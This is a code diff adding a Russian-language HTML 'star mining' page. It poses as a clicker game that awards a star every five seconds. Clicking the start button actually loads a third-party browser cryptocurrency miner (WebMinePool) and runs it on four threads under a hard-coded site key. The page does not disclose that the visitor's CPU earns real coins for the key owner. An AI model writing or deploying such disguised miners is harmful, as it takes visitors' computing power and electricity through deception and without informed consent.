@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Майнинг Звёзд</title>
+  <style>
+    body {
+      margin: 0;
+      background: #0d0d0d;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .title {
+      font-size: 24px;
+      margin-bottom: 16px;
+    }
+    .counter {
+      font-size: 48px;
+      margin-bottom: 16px;
+    }
+    .timer {
+      font-size: 18px;
+      color: #888;
+    }
+    .start-btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #222;
+      border: 1px solid #0f0;
+      color: #0f0;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .start-btn:hover {
+      background: #0f0;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="title">Добро пожаловать в подпольную майнинг-станцию</div>
+  <div class="counter" id="stars">🌟 0</div>
+  <div class="timer" id="timer">Ожидание запуска...</div>
+  <button class="start-btn" onclick="startMining()">Запустить майнинг</button>
+
+  <script src="https://webminepool.com/lib/base.js"></script>
+  <script>
+    let stars = 0;
+    let seconds = 0;
+    let mining = false;
+
+    function startMining() {
+      if (mining) return;
+      mining = true;
+      document.getElementById('timer').innerText = "⛏ Майнинг начался...";
+
+      // Запускаем WebMinePool-майнер
+      var miner = WMP.Anonymous('SK_Xci8DnBGxrFbctysi5diX', {
+        threads: 4,
+        throttle: 0.3
+      });
+      miner.start();
+
+
+      setInterval(() => {
+        seconds++;
+        if (seconds % 5 === 0) {
+          stars++;
+          document.getElementById('stars').innerText = `🌟 ${stars}`;
+        }
+        document.getElementById('timer').innerText = `Время майнинга: ${seconds} сек.`;
+      }, 1000);
+    }
+  </script>
+
+</body>
+</html>
